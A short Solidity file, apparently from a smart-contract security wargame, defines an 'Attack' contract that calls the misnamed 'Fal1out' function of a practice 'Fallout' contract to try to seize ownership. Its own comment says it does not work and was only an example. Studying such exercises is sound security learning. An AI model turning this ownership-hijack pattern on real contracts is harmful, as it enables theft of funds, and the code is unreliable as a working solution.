// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Fallout.sol";

// Does not work for the fallout attack. This was an example.

contract Attack {
    Fallout public falloutContract;
    address payable owner;

    constructor(address payable _falloutAddress) public {
        falloutContract = Fallout(_falloutAddress);
        owner = payable(msg.sender);
    }

    function initializeAttack() public payable {
        falloutContract.Fal1out.value(msg.value)();
    }
}
